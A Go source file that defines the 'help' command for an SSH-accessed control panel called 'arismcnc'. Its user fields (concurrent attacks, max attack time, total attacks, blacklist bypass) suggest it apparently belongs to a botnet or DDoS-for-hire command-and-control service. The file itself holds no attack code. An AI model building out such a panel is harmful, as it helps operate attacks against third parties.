package cmds

import (
	"arismcnc/database"
	"arismcnc/utils"
	"fmt"
	"io"
	"log"
	"strconv"
	"time"

	"github.com/gliderlabs/ssh"
)

// HelpCommand example command, not restricted to admins
type HelpCommand struct{}

func (c *HelpCommand) Name() string {
	return "help"
}

func (c *HelpCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	userInfo := db.GetAccountInfo(session.User())
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	if err != nil {
		log.Print(err)
	}

	helpBranding := utils.Branding(session, "help", map[string]interface{}{
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
		"sleep": func(duration int) {
			time.Sleep(time.Duration(duration) * time.Millisecond)
		},
	})
	fmt.Fprintln(output, helpBranding)
}

func (c *HelpCommand) AdminOnly() bool {
	return false
}

// Aliases for HelpCommand
func (c *HelpCommand) Aliases() []string {
	return []string{"h"}
}

// Register HelpCommand in the CommandMap
func init() {
	CommandMap["help"] = &HelpCommand{}
}
